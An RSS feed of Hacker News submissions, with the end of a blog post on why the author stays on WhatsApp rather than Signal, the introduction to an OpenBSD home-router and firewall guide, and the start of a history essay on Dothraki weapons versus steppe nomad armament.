<figure><img data-attachment-id="162" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-5/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?fit=473%2C896&amp;ssl=1" data-orig-size="473,896" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-5" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?fit=158%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?fit=473%2C896&amp;ssl=1" loading="lazy" width="473" height="896" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=473%2C896&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=158%2C300&amp;ssl=1 158w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=158%2C300&amp;ssl=1 158w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=473%2C896&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<p><strong>I’m skipping Parent control app, because even though listed as a chat app it does not appear to look like a chat app.</strong></p>
<h2>Signal</h2>
<p>When it comes to chat apps, it’s unbelievable to see that Signal is basically not collecting any user data.</p>
<p>They also provide end to end encrypted chats by default.</p>
<p>The lack of collecting user data is a sign that they don’t need to sell user data as a way to make money. </p>
<p>Signal is currently depending on <a rel="noreferrer noopener" href="https://signal.org/donate" target="_blank">donations</a>, and even if they find other ways to monetize the service, as long as they are not collecting data, we can be sure that our data is not being used to monetize the service.</p>
<figure><img data-attachment-id="163" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-6/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?fit=473%2C672&amp;ssl=1" data-orig-size="473,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-6" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?fit=211%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?fit=473%2C672&amp;ssl=1" loading="lazy" width="473" height="672" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=473%2C672&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=211%2C300&amp;ssl=1 211w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=211%2C300&amp;ssl=1 211w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=473%2C672&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>BOTIM</h2>
<p>I have not used the BOTIM and I have no idea why it’s there in the charts ahead of other chat apps like WeChat and Line.</p>
<p>Maybe BOTIM has a niche audience that I don’t know about.</p>
<figure><img data-attachment-id="164" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-7/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?fit=473%2C832&amp;ssl=1" data-orig-size="473,832" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-7" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?fit=171%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?fit=473%2C832&amp;ssl=1" loading="lazy" width="473" height="832" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=473%2C832&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=171%2C300&amp;ssl=1 171w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=171%2C300&amp;ssl=1 171w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=473%2C832&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Why <strong>I’</strong>n not/<strong>can’t</strong> use Signal</h2>
<p>I love to use Signal, I wish everyone can use Signal, and I wish I can use Signal, but I just can’t.</p>
<p>I have installed any tried using Signal couple of times, but whenever I install it it’s basically a ghost town. No one is using it and I can’t convince anyone else to join, because none of their friends on Signal either.</p>
<p>The network effect on WhatsApp is strong, and almost all of my non techie regular WhatsApp users will just accept the new TOS and will share their data with Facebook. They just want a chat app and that is what WhatsApp is providing.</p>
<p>Even if I install Signal, I will be the only one in my network using it. And no one will be willing to use Signal just to chat with me.</p>
<p>I will try to keep my personal messages away from WhatsApp as much as possible, but. I won’t be able to leave my WhatsApp groups. I will use iMessages whenever I’m chatting with someone with an Apple device.</p>
<h2>What we <strong>actually</strong> need</h2>
<p>What we actually need is not Signal, WhatsApp or Telegram. What we need is a protocol, just like email but for chat and apps that build on top of this protocol.</p>
<p>There are such protocols, but no major company is willing to use them for their chat apps.</p>
<p>If we have such protocol, then we will be able to switch apps with ease, without having to worry about the network effect or losing out chats just like we can do with our emails.</p>
<p>So please everyone try to invest on a protocol, not on an individual app.</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682981</guid>
            <pubDate>Fri, 08 Jan 2021 09:16:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Where is the “average” person in each US state?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25682905">thread link</a>) | @marwahaha
<br/>
January 8, 2021 | https://marwahaha.github.io/ca-center/viewer | <a href="https://web.archive.org/web/*/https://marwahaha.github.io/ca-center/viewer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://marwahaha.github.io/ca-center/viewer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682905</guid>
            <pubDate>Fri, 08 Jan 2021 09:00:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenBSD Router Guide – Hakk.gg]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682743">thread link</a>) | @rodrigo975
<br/>
January 8, 2021 | https://hakk.gg/openbsd-router-guide | <a href="https://web.archive.org/web/*/https://hakk.gg/openbsd-router-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<div>
<p>Network segmenting firewall, DHCP, DNS with Unbound, domain blocking and much more</p>
<h2><span id="Introduction">Introduction</span></h2>
<div>
<p>In this guide we’re going to take a look at how we can use cheap and “low end” hardware to build an amazing OpenBSD router with firewalling capabilities, segmented local area networks, DNS with domain blocking, DHCP and more.</p>
<p>We will use a setup in which the router segments the local area network (LAN) into three separate networks, one for the grown-ups in the house, one for the children, and one for public facing servers, such as a private web server or mail server. We will also look at how we can use DNS to block out ads, porn, and other websites on the Internet. The OpenBSD router can also be used on small to mid-size offices.</p>
</div>
<h2 id="why-a-firewall"><span id="Why_a_firewall">Why a firewall?</span></h2>
<p>Almost no matter how you connect to the Internet from your home or office, you need a real firewall between you and the modem or router that your ISP has provided you with.</p>
<p>Very rarely do consumer-grade modems or routers get firmware updates and they are often vulnerable to&nbsp;<a href="https://en.wikipedia.org/wiki/Home_router#Security">network attacks</a>&nbsp;that turns these devices into&nbsp;<a href="https://en.wikipedia.org/wiki/Botnet">botnets</a>, such like the&nbsp;<a href="https://en.wikipedia.org/wiki/Mirai_(malware)">Mirai malware</a>. Many consumer-grade modems and routers is to blame for some of the largest&nbsp;<a href="https://en.wikipedia.org/wiki/Distributed_denial_of_service_attack">distributed denial of service (DDoS) attacks</a>.</p>
<p>A firewall between you and your ISP modem or router cannot protect your modem or router device against attacks, but it can protect your computers and devices on the inside of the network, and it can help you monitor and control the traffic that comes and goes to and from your local network.</p>
<p>Without a firewall between your local network and the ISP modem or router you could basically consider this an open door policy, like leaving the door to your house wide open, because you cannot trust the equipment from your ISP.</p>
<p>It is always a really good idea to put a real firewall between your local network and the Internet, and with OpenBSD you get an very solid solution.</p>
<h2 id="the-hardware"><span id="The_hardware">The hardware</span></h2>
<p>You don’t have to buy expensive hardware to get an effective router and firewall for your house or office. Even with cheap and “low end” hardware you can get a very solid solution.</p>
<p>I have build multiple solutions with the&nbsp;<a href="https://www.asrock.com/mb/Intel/Q1900DC-ITX/">ASRock Q1900DC-ITX</a>&nbsp;motherboard that comes with an Intel Quad-Core Celeron processor.</p>
<p><img src="https://hakk.gg/wp-content/themes/veen/assets/images/transparent.gif" data-lazy="true" data-src="https://www.unixsheikh.com/includes/img/asrock-q1900dc-itx.png" alt="ASRock Q1900DC-ITX motherboard"></p>
<p>I’ll admit, it’s a pretty “crappy” motherboard, but it gets the job done and I have several builds that have run very solid for many years on gigabit networks with full saturation and the firewall, DNS, etc. working “overtime” and the CPU hardly breaks a sweat.</p>
<p>The ASRock Q1900DC-ITX motherboard has the advantage that it comes with a DC-In Jack that is compatible with a 9~19V power adapter, making it very power saving. Unfortunatly the ASRock Q1900DC-ITX motherboard is no longer made, but I’m just using it as an example, I have used several other cheap boards as well.</p>
<p>I have also used the ASRock Q1900-ITX (it doesn’t come with the DC-In Jack) combined with a PicoPSU.</p>
<p><img src="https://hakk.gg/wp-content/themes/veen/assets/images/transparent.gif" data-lazy="true" data-src="https://www.unixsheikh.com/includes/img/picopsu.png" alt="PicoPSU power supply"></p>
<p>You can find different brands and versions of the PicoPSU, some are better quality than others. I have two different brands, the original and a cheaper knockoff, both performs very well and they save quite a bit of power contrary to running with a normal power supply.</p>
<p>Last, I am using a cheap Intel knockoff quad port NIC found on Ebay like this one:</p>
<p><img src="https://hakk.gg/wp-content/themes/veen/assets/images/transparent.gif" data-lazy="true" data-src="https://www.unixsheikh.com/includes/img/intel-quad-nic.png" alt="Intel Quad NIC"></p>
<p>I know it is better to use quality hardware, especially on a network that you care about, but this tutorial is about how you can get away with using fairly cheep hardware and still get an extremely useful product that will continue to serve you well for many years – at least that is my experience.</p>
<p>I recommend that you look for a low power mini ITX board with hardware&nbsp;<a href="https://www.openbsd.org/amd64.html">supported by OpenBSD</a>, such as an Intel Celeron or Intel i3 processor. These boards are typically cheap, less power hungry, and they don’t take up much space. I don’t recommend using the Intel Atom CPU if you have a gigabit network as they usually choke because they can’t handle the amount of traffic, but your mileage may vary.</p>
<p>You might also need a couple of cheap gigabit switches for the segmented local network, at least if you have more than one computer you want to connect to the same LAN 🙂</p>
<h2 id="why-openbsd"><span id="Why_OpenBSD">Why OpenBSD?</span></h2>
<p>In truth, you can get a similar setup with one of the other&nbsp;<a href="https://en.wikipedia.org/wiki/Comparison_of_BSD_operating_systems">BSD flavors</a>&nbsp;or one of the many different&nbsp;<a href="https://en.wikipedia.org/wiki/Linux_distribution">Linux distribution</a>, but&nbsp;<a href="https://www.openbsd.org/">OpenBSD</a>&nbsp;is specifically very well suited and designed for this kind of task. Not only does it come with all the needed software in the base install, but it also has significantly better security and tons of improved mitigations already build-in into the operating system. I&nbsp;<a href="https://www.unixsheikh.com/articles/openbsd-is-fantastic.html">highly recommend</a>&nbsp;OpenBSD over any other operating system for this kind of task.</p>
<p>This guide is not going to show you how to install OpenBSD. If you haven’t done that before I recommend you spin up some kind of virtual machine or see if you have some unused and supported hardware laying around you can play with. OpenBSD is one of the easiest and quickest operating systems to install. Don’t be afraid of the non-gui approach, once you have tried it you will really appreciate the simplicity. Use the default settings when in doubt.</p>
<p>Before you endeavor on this journey make sure to reference the OpenBSD documentation! Not only is everything very well documented, but you will most likely find all the answers you need right there. Read the&nbsp;<a href="https://www.openbsd.org/faq/index.html">OpenBSD FAQ</a>&nbsp;and take a look at the different&nbsp;<a href="https://man.openbsd.org/">manual pages</a>&nbsp;for the software we’re going to use.</p>
<p>Another really useful place to find general information about OpenBSD is the&nbsp;<a href="https://marc.info/?l=openbsd-misc">OpenBSD mailing list archives</a>. Also make sure to stay up to date with relevant information by subscribing to the&nbsp;<a href="https://www.openbsd.org/mail.html">Announcements and security advisories</a>&nbsp;mailing list.</p>
<p>Last, but not least, please consider&nbsp;<a href="https://www.openbsd.org/donations.html">supporting OpenBSD</a>! Even if you don’t use OpenBSD on a daily basis, but perhaps make use of&nbsp;<a href="https://www.openssh.com/">OpenSSH</a>&nbsp;on Linux, then you’re really using software from the OpenBSD project. Consider making a small, but steady donation to support the further development of all the great software the OpenBSD developers make!</p>
<h2 id="the-network"><span id="The_network">The network</span></h2>
<p>A router is basically a device that regulate network traffic between two or more separate networks. The router will ensure that network traffic intended for the local network doesn’t run out into the wild on the Internet, and traffic on the Internet, that is not intended for your local network, stays on the Internet.</p>
<p><b>NOTE:</b><br>
A router is sometimes also referred to as a gateway, which generally is alright, but in truth a real gateway joins dissimilar systems, while a router joins similar networks. An example of a gateway would be a device that joins a PC network with a telecommunications network.</p>
<p>In this tutorial we’re building a router and we have 4 networks of the same type to work with. One is the Internet and the other three are the internally segmented local area networks (LANs). Some people prefer to work with virtual LANs, but in this tutorial we’re going to use the quad port NIC from the illustration above. You can achieve the same result by using multiple one port NICs if you prefer that, you just have to make sure that you have enough room and free PCI slots on the motherboard. You can also use the Ethernet port on the motherboard itself, but it depends on the driver and support for the device. I have had no problems using the Realtek PCI gigabit Ethernet controller that normally comes with many motherboards even though I recommend Intel over Realtek.</p>
<p>Of course you don’t have to segment the network into several parts if you don’t need that, and it will be very easy to change the settings from this guide, but I have decided to use this approach in order to show you how you can protect your children by segmenting their network into a separate LAN that not only gets ad and porn blocking using DNS blocking (all the segments gets that), but you can even whitelist the parts of the Internet you want them to have access to. The last part about whitelisting is difficult and generally not recommended unless your children requires only very limited access, but it is doable with some work, and the guide is going to show you one way you can do that.</p>
<p>This is an illustration of the network we’re going to setup:</p>
<pre><code>
                       Internet
                          |
                    xxx.xxx.xxx.xxx
                    ISP Modem (WAN)
                      10.24.0.23
                          |
                       OpenBSD
                      10.24.0.50
                  (router/firewall)
                          |
     -------------------------------------------
     |                    |                    |
    NIC1                 NIC2                 NIC3
192.168.1.1          192.168.2.1          192.168.3.1
LAN1 switch          LAN2 switch          LAN3 switch
     |                    |                    |
     -- 192.168.1.x       -- 192.168.2.x       -- 192.168.3.2
     |  Grown-up PC       |  Child PC1         |  Public web server
                          |
                          -- 192.168.2.x
                          |  Child PC2
</code></pre>
<p>The IP addresses that begins with 10.24.0 are whatever IP addresses your ISP router or modem gives you, it may be something very different. The IP addresses beginning with 192.168 are the IP addresses that we’re going to use in the guide for our local area network (LAN).</p>
<p>The guide does not deal with any kind of wireless connectivity. Wireless chip firmware is notoriously buggy and exploitable and I recommend you don’t use any kind of wireless connectivity, if you can do without. If you do require wireless connectivity I strongly recommend that you disable wireless access from the ISP modem or router completely (if possible), and then buy the best wireless router you can find and put it behind the firewall in an isolated segment instead. That way should your wireless device ever be compromised you can better control the outcome and limit the damage. You can further setup the wireless router such that any devices connected to it have their own IPs that pass directly through the wireless router, but at …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hakk.gg/openbsd-router-guide">https://hakk.gg/openbsd-router-guide</a></em></p>]]>
            </description>
            <link>https://hakk.gg/openbsd-router-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682743</guid>
            <pubDate>Fri, 08 Jan 2021 08:24:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collections: That Dothraki Horde, Part IV: Screamers and Howlers]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25682359">thread link</a>) | @Illniyar
<br/>
January 7, 2021 | https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the fourth part of a four part (<a href="https://acoup.blog/2020/12/04/collections-that-dothraki-horde-part-i-barbarian-couture/">I</a>, <a href="https://acoup.blog/2020/12/11/collections-that-dothraki-horde-part-ii-subsistence-on-the-hoof/">II</a>, <a href="https://acoup.blog/2020/12/18/collections-that-dothraki-horde-part-iii-horse-fiddles/">III</a>) look at the Dothraki from George R. R. Martin’s <em>A Song of Ice and Fire</em> and HBO’s <em>Game of Thrones</em>.  We’re looking at, in particular, if Martin’s claim that the Dothraki are “an amalgam of a number of steppe and plains cultures” can be sustained in the face of even basic knowledge about historical Steppe and Great Plains nomadic peoples.</p>



<p>Last week, we <a href="https://acoup.blog/2020/12/18/collections-that-dothraki-horde-part-iii-horse-fiddles/">concluded </a>that the vast majority of Dothraki culture, social organization, economic practices and family structure are effectively completely untethered from the historical realities of effectively any of the literally dozens of historical Great Plains Native Americans or Steppe nomads.  This week, we’re going to close out our look by discussing Dothraki warfare.  We’ll start with the visual – weapons and armor – and then move to the conceptual – strategy, operations and tactics.</p>



<p>And as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>Finally, as a reminder both of what we are investigating, <strong>the key statement we are really assessing here is <a href="https://www.westeros.org/Citadel/SSM/Entry/6040/">this one by George R.R. Martin</a>:</strong></p>



<blockquote><p>The Dothraki were actually fashioned as an amalgam of a number of steppe and plains cultures… Mongols and Huns, certainly, but also Alans, Sioux, Cheyenne, and various other Amerindian tribes… seasoned with a dash of pure fantasy.</p></blockquote>



<p>It is not the <em>existence</em> of a fantasy culture which draws our attention, but the explicit declaration that this fantasy culture is not merely inspired, but ‘fashioned as an amalgam’ of real cultures, which both existed in the past <em>and still exist today</em>, with only ‘a dash of pure fantasy.’  That line is important, to be clear, <strong>because it presents the fictional Dothraki as a statement on historical Native American and Eurasian nomads</strong> and – when combined with Martin’s statements that he relies on history to inform his work – that this statement is based in some sort of historical reality.</p>



<p>Which it isn’t.  But we’re getting ahead of ourselves.</p>



<h2>Where There’s a Whip…</h2>



<p>The Dothraki are described as having three main weapons: <strong>bows </strong>(<em>AGoT</em>, 86, 555, 558, 597, 669), <strong>whips </strong>(<em>AGoT</em>, 86, 194, 493, 555, 596, 669) and a <strong>curved sword called an <em>arakh</em></strong> (<em>AGoT</em> 85, 86, 327, 493, 555, 556, 559, 560, 596, 597, 669, 674); <strong>of these, the <em>arakh</em> is clearly the most prominent</strong> (I am sure I have missed a reference to a weapon here or there, but I hope the citations here give some sense of the relative weight each is given – the <em>arakh</em> is the most frequently mentioned by some distance).  When a Dothraki warrior enters <em>Vaes Dothrak</em>, each, “unbelted his <em>arakh</em> and handed it to a waiting slave, and any other weapons he carried as well” – after the <em>arakh</em>, the other weapons are seemingly afterthoughts (<em>AGoT</em>, 327).  The prominence of the <em>arakh</em> in the narrative is underscored by the fact that it is the only one of these weapons whose name we learn in Dothraki, or which is described in terms of its shape or special function (<em>AGoT</em>, 85), while the bows and whips remain just bows and whips (ironic, as it was Steppe <em>bows</em>, not Steppe swords, which were unusual).</p>



<p>We might dismiss this as simply an accident of Daenerys’ perspective – that, being Westerosi, she focuses on the weapon most meaningful to the Westerosi – but that’s clearly not true.  After all, the <strong>offering of an <em>arakh</em> is how Daenerys’ loyal followers demonstrate their fealty to her</strong>, in a ceremony that is clearly Dothraki, not Westerosi (<em>AGoT</em>, 674).  It is also, I should note,<a href="https://awoiaf.westeros.org/index.php/Arakh"> the only weapon we see <em>non</em>-Dothraki using that is clearly identified as being foreign and typical of the Dothraki</a>.  It remains special through the eyes of multiple point-of-view characters, including military men.</p>



<p>(And, as an aside, now that we are this far in, it seems obvious but worth saying that the fact that Martin has no Dothraki viewpoint characters in his narrative is hardly a saving grace; it merely intensifies the ‘view of a savage culture from outside’ effect.  As we’ll see, this makes perfect sense given what seem to be the actual inspirations for his depiction.)</p>



<p><strong>The prominence of a curved iron (or steel) sword lets us rule out a Great Plains Native American inspiration for this kit right out</strong>; the sword was never a significant part of Plains Native American armament (the lack of tool-metal production in the Americas prior to European contact means that there was no indigenous sword-making tradition, although the <a href="https://en.wikipedia.org/wiki/Macuahuitl"><em>maquahuitl</em> </a>represents a clever sort of ‘sharpened club’ design).  Even after contact, it’s hard to avoid the conclusion that the expense of trading for a sword wouldn’t have been justified by its utility over a steel axe which might also double as a tool (on axes, see W. Lee, “The Military Revolution of Native North America: Firearms, Forts and Politics” in <em>Empires and Indigenes</em> (2011), 62-3).  <strong>So we must turn to the Eurasian Steppe</strong>.</p>



<p><strong>And immediately we run into problems</strong>, not that any of these weapons are <em>wrong</em> per se, but <strong>that their proportion and prominence is all mixed up and that there are other, far more important weapons missing.</strong></p>



<p><strong>For a Steppe nomad, by far, above and away, the most important weapon was the bow.</strong>  The Armenians literally called the Mongols “the nation of archers” (May, <em>Mongol Art of War</em>, 43).  Nomads spent the most time learning the bow (May, <em>op. cit.</em> 42-49) and it was the one indispensable weapon.  Indeed, so indispensable that nomads were generally required to have several; the <em>Liao Shi</em> records that Khitan nomad warriors were required to possess four bows and 400 arrows, while John de Plano Carpini reports that the Mongols all needed to have 2-3 bows and three larger quivers (May, <em>op. cit. </em>49-50).  <strong>The Steppe bow itself would also have looked unusual in both shape and construction</strong> to a Westerosi observer either strung or unstrung – they were composite bows, made with a wood core, a backing of horn and a rigid end-piece (called a <em>siyah</em> in Arabic) and were generally drawn with the use of a thumb-ring to reduce strain on the thumb (May, <em>op. cit.</em>, 50-1).  This unique construction allowed these bows to reach draw weights and launch energies equivalent to the far larger yew longbows of England and Wales and still be compact enough to use from horseback.</p>



<div><figure><img data-attachment-id="5819" data-permalink="https://acoup.blog/ilkhanidhorsearcher-2/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg" data-orig-size="450,350" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ilkhanidhorsearcher" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=450" src="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=450" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg 450w, https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=300 300w" sizes="(max-width: 450px) 100vw, 450px"><figcaption><a href="https://en.wikipedia.org/wiki/Mongols#/media/File:IlkhanidHorseArcher.jpg">Via Wikipedia</a>, a 13th century Mongol horse archer.  Lightly armored, he carries a bow (and a fancy hat) but no sword.</figcaption></figure></div>



<p>(I should note that the bow was <em>also</em> the paramount weapon for the Native American horse-borne nomads of the Great Plains, at least until it came into competition with firearms, though my understanding is that Native American bows were not as powerful as Steppe bows).</p>



<div><figure><img loading="lazy" data-attachment-id="5821" data-permalink="https://acoup.blog/minolta-dsc/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg" data-orig-size="1920,2560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;DiMAGE A1&quot;,&quot;caption&quot;:&quot;Minolta DSC&quot;,&quot;created_timestamp&quot;:&quot;1118415959&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;12.91796875&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0003125&quot;,&quot;title&quot;:&quot;Minolta DSC&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Minolta DSC" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=225" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=768" src="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=768" alt="" width="596" height="795" srcset="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=596 596w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=1192 1192w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=113 113w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=225 225w" sizes="(max-width: 596px) 100vw, 596px"><figcaption><a href="https://en.wikipedia.org/wiki/Mongols#/media/File:Naadam_women_archery.jpg">Via Wikipedia</a>, a modern Mongolian woman taking part in an archery contest.  You can see here the unique shape and multi-part construction of the Steppe bow (notice how the material on the tips, the belly and the spine of the bow are all different) which allows it so much power in such a small frame.<br>Also, notice the very nice and colorful traditional Mongolian clothing – not leather and rough furs!</figcaption></figure></div>



<p><strong>But even after the bow, the sword is not first.  Or even close to first.</strong>  Or, indeed, <em>even on the list</em>!  The Khitan regulations I mentioned included four bows, two spears (one ‘long’ and one ‘short’), a club, an axe and a halberd, but no sword.  John de Plano Carpini describes the full kit as two or three bows with quivers, an axe, ropes, and swords <em>only for the wealthy</em> (May. <em>op. cit.</em>, 50).  Speaking more broadly, May notes that spears (used as lances from horseback) seem universal in accounts of the Mongols, but “accounts are contradictory regarding whether these [swords] were universally used” (May, <em>op. cit.</em>, 52).  While May supposes that the <em>ughurgh-a</em>, the Mongolian lasso, might have been used in combat – and it may well have – we have no definitive evidence of it.  If it was ever a weapon, it doesn’t seem to have been an important one.</p>



